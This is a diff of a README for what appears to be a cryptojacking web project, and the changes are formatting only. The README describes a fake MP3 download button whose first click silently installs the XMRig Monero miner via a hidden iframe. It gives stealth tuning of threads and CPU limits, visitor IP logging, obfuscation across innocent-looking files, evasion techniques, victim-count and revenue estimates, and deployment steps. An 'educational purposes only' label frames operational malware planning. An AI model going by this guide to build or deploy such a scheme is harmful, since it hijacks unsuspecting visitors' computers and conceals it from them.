@@ -15,11 +15,13 @@ This code is provided for **EDUCATIONAL PURPOSES ONLY** to demonstrate how malic
 ### Core Functionality
 
 1. **Double-Click Download Mechanism**
+
    - First click silently downloads the XMRig Monero miner
    - Shows a "Processing..." loading state to the user
    - Second click delivers the actual MP3 file
 
 2. **Stealth Features**
+
    - User IP and user-agent logging
    - Hidden iframe-based download to prevent download notifications
    - Obfuscated code split across multiple innocent-looking utility files
@@ -69,6 +71,7 @@ This code is provided for **EDUCATIONAL PURPOSES ONLY** to demonstrate how malic
 In `client/src/lib/minerConfig.ts`, you can adjust:
 
 - **Performance Settings**
+
   - `threads`: Number of CPU threads to use (2-4 recommended for stealth)
   - `cpuLimit`: CPU usage percentage limit (40-60% recommended)
   - `idleOnly`: Only mine when the computer is idle
@@ -82,6 +85,7 @@ In `client/src/lib/minerConfig.ts`, you can adjust:
 ### Estimating Mining Capacity
 
 Use the included calculator in `wallet-config.html` to estimate:
+
 - How many computers can mine simultaneously based on your site traffic
 - Potential revenue based on current Monero prices
 
@@ -93,18 +97,19 @@ Use the included calculator in `wallet-config.html` to estimate:
 2. Open the browser console
 3. Include the test script:
    ```javascript
-   const script = document.createElement('script');
-   script.src = '/src/test-e2e.js';
+   const script = document.createElement("script");
+   script.src = "/src/test-e2e.js";
    document.head.appendChild(script);
    ```
 4. Run the tests:
    ```javascript
-   runE2ETests().then(results => console.log(results));
+   runE2ETests().then((results) => console.log(results));
    ```
 
 ### Manual Testing
 
 Follow the testing plan in `testing-deployment-plan.md` to verify:
+
 - First click downloads the stealth payload
 - Loading state appears correctly
 - Second click downloads the actual MP3
@@ -117,17 +122,20 @@ See `testing-deployment-plan.md` for detailed deployment instructions to Vercel.
 ## Scaling Considerations
 
 The number of computers mining simultaneously depends on:
+
 - Your website's traffic volume
 - Percentage of visitors who click the download button
 - How long miners remain active before detection
 
 For example:
+
 - 1,000 daily visitors with 10% click rate = 100 new miners per day
 - With average 7-day retention = ~700 simultaneous miners
 
 ## Security Considerations
 
 This implementation uses several techniques to avoid detection:
+
 - Code obfuscation and splitting across multiple files
 - Hidden iframe for stealth downloads
 - Delayed execution and idle-only mining
